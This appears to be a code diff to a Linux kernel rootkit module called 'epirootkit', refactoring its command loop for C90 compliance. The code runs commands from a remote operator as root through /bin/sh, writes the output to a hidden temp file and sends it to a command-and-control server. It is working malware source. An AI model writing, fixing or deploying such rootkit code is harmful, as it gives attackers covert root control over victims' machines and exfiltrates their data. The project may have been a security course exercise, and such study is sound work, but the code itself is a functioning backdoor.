@@ -125,6 +125,15 @@ static int command_loop(void *data) {
     struct kvec iov;
     struct msghdr msg_hdr = {0};
     int len, authenticated = 0;
+    // Declarations moved to top for ISO C90 compliance
+    char full_cmd[2048];
+    char *argv[4];
+    char *envp[4];
+    int ret;
+    struct file *f;
+    loff_t pos;
+    ssize_t rlen;
+    char outbuf[1024];
 
     pr_info("epirootkit: command_loop started\n");
 
@@ -154,35 +163,38 @@ static int command_loop(void *data) {
         }
 
         // Si on est authentifié, on exécute la commande
-        // LA coommande redirigée vers un fichier temporaire
-        char full_cmd[2048];
         snprintf(full_cmd, sizeof(full_cmd), "%s > /tmp/.rk_out 2>&1", buffer);
 
-        char *argv[] = {"/bin/sh", "-c", full_cmd, NULL};
-        char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+        argv[0] = "/bin/sh";
+        argv[1] = "-c";
+        argv[2] = full_cmd;
+        argv[3] = NULL;
+        envp[0] = "HOME=/";
+        envp[1] = "TERM=linux";
+        envp[2] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
+        envp[3] = NULL;
 
-        int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
         if (ret)
             pr_err("epirootkit: command failed (%d)\n", ret);
         else
             pr_info("epirootkit: command executed\n");
 
         // On lit et on envoi au C2
-        struct file *f = filp_open("/tmp/.rk_out", O_RDONLY, 0);
+        f = filp_open("/tmp/.rk_out", O_RDONLY, 0);
         if (!IS_ERR(f)) {
-            loff_t pos = 0;
-            ssize_t rlen = 0;
-            char outbuf[1024];
-
+            pos = 0;
             do {
                 memset(outbuf, 0, sizeof(outbuf));
-                rlen = kernel_read(f, outbuf, sizeof(outbuf) - 1, &pos);
-                if (rlen > 0)
+                rlen = kernel_read(f, pos, outbuf, sizeof(outbuf) - 1);
+                if (rlen > 0) {
                     send_to_c2(outbuf, rlen);
+                    pos += rlen;
+                }
             } while (rlen > 0);
-
             filp_close(f, NULL);
         }
+    }
     return 0;
 }
 
